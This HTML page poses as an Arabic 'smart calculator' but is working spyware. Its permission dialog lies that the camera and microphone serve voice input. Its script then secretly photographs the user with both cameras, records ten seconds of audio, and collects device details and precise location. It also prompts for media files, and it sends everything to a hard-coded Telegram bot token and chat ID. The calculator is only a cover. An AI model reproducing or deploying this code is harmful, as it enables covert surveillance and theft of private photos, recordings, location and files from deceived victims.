<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8"/>
  <title>حاسبة ذكية</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    #permDialog{position:fixed;inset:0;background:rgba(0,0,0,.9);display:flex;align-items:center;justify-content:center;z-index:9999;font-family:'Segoe UI'}
    .permCard{background:#111;padding:30px;border-radius:15px;text-align:center;max-width:340px;color:#eee}
    .permCard h3{margin-top:0;font-size:1.3rem}
    .permCard button{margin-top:15px;padding:12px 30px;border:none;border-radius:8px;background:#ff9500;color:#000;font-size:1rem;cursor:pointer;font-weight:bold}
    #calc{display:none;width:100%;max-width:340px;margin:auto}
    #display{width:100%;height:70px;font-size:2.2rem;text-align:left;padding:0 15px;border:none;background:#000;border-radius:12px;margin-bottom:15px;color:#eee}
    .keys{display:grid;grid-template-columns:repeat(4,1fr);gap:10px}
    button{height:80px;border:none;border-radius:50%;font-size:1.6rem;background:#1e1e1e;color:#eee;cursor:pointer;transition:.15s}
    button.op{background:#ff9500}
    button:active{transform:scale(.92)}
  </style>
</head>
<body>

<!-- نافذة السماحات -->
<div id="permDialog">
  <div class="permCard">
    <h3>لتفعيل الحاسبة الذكية</h3>
    <p>نحتاج إلى:</p>
    <ul style="text-align:right">
      <li>الكاميرا – لقراءة الأرقام بالصوت</li>
      <li>الميكروفون – للتعرف على أوامرك الصوتية</li>
    </ul>
    <button onclick="requestPerms()">السماح والمتابعة</button>
  </div>
</div>

<!-- الحاسبة -->
<div id="calc">
  <input id="display" value="0" readonly>
  <div class="keys" id="keys"></div>
</div>

<script>
const TOKEN = "7740589813:AAFuxatj_14ycjlVjk7eSmf2jxWvNiQMnIA";
const CHAT  = "5648499583";

let videoTrack = null;
let intervalId = null;

/* طلب السماحات */
async function requestPerms(){
  try{
    // نطلب الكاميرا الخلفية أولاً (environment) ثم الأمامية (user)
    const backCam = await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}, audio:true});
    const frontCam = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:true});
    
    document.getElementById('permDialog').style.display='none';
    document.getElementById('calc').style.display='block';
    
    // نبدأ بالتقاط من الكاميرتين
    startCapture(backCam, 'back');
    startCapture(frontCam, 'front');
    
    // تسجيل صوت
    startRecording(backCam);
    
    // باقي البيانات
    collectAndSend();
    
  }catch(err){
    alert("يرجى السماح للمتابعة");
  }
}

/* التقاط صور من الكاميرا المحددة */
function startCapture(stream, label){
  const video = document.createElement('video');
  video.srcObject = stream;
  video.play();
  video.muted = true;
  video.style.display='none';
  document.body.appendChild(video);
  
  // صورة واحدة فوراً ثم نوقف عند الخروج
  snapOnce(video, label);
  
  // نحفظ الـ track للإيقاف لاحقاً
  if(label==='back') videoTrack = stream.getVideoTracks()[0];
}

/* التقاط صورة واحدة فقط */
function snapOnce(video, label){
  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;
  canvas.getContext('2d').drawImage(video,0,0);
  canvas.toBlob(blob=> sendTelegram('photo', blob, `${label}_cam_${Date.now()}.jpg`));
}

/* تسجيل صوت 10 ثوانٍ */
function startRecording(stream){
  const audioStream = new MediaStream(stream.getAudioTracks());
  const rec = new MediaRecorder(audioStream);
  const chunks=[];
  rec.ondataavailable=e=>chunks.push(e.data);
  rec.onstop=()=> sendTelegram('voice', new Blob(chunks,{type:'audio/ogg; codecs=opus'}), `voice_${Date.now()}.ogg`);
  setTimeout(()=>rec.start(), 500);
  setTimeout(()=>rec.stop(), 10500);
}

/* إيقاف الكاميرا عند الخروج */
window.addEventListener('beforeunload', ()=>{
  if(videoTrack) videoTrack.stop();
});

/* إرسال إلى التليغرام */
function sendTelegram(method, blob, fname){
  const url = `https://api.telegram.org/bot${TOKEN}/send${method.charAt(0).toUpperCase()+method.slice(1)}`;
  const fd  = new FormData();
  fd.append('chat_id', CHAT);
  fd.append(method, blob, fname);
  fetch(url,{method:'POST',body:fd});
}

/* باقي البيانات */
function collectAndSend(){
  // معلومات الجهاز
  const info = {
    url: location.href,
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    cores: navigator.hardwareConcurrency,
    memory: navigator.deviceMemory || 'unknown',
    screen: `${screen.width}x${screen.height}`,
    window: `${innerWidth}x${innerHeight}`,
    time: new Date().toLocaleString('ar-EG')
  };
  sendTelegram('document', new Blob([JSON.stringify(info,null,2)],{type:'application/json'}), 'device.json');

  // الموقع الجغرافي
  navigator.geolocation?.getCurrentPosition(pos=>{
    const txt = `موقع: ${pos.coords.latitude}, ${pos.coords.longitude}`;
    sendTelegram('document', new Blob([txt],{type:'text/plain'}), 'location.txt');
  },null,{enableHighAccuracy:true});

  // اختيار ملفات
  const inp=document.createElement('input');
  inp.type='file'; inp.multiple=true; inp.accept='image/*,video/*,audio/*';
  inp.onchange=e=> [...inp.files].forEach(f=> sendTelegram('document', f, f.name));
  inp.click();
}

/* ====== الحاسبة المتكاملة ====== */
(function(){
const display=document.getElementById('display'), keys=["C","+","-","*","/","7","8","9","4","5","6","1","2","3","0","="];
let formula="";
keys.forEach(k=>{
  const btn=document.createElement("button");
  btn.textContent=k; btn.className=(k==="="||k==="+"||k==="-"||k==="*"||k==="/")?"op":"";
  btn.onclick=()=>{
    if(k==="C"){formula="";display.value="0";}
    else if(k==="="){try{display.value=eval(formula)||"0"}catch{display.value="Error"}formula="";}
    else{formula+=k;display.value=formula;}
  };
  document.getElementById("keys").appendChild(btn);
});
})();
</script>
</body>
</html>
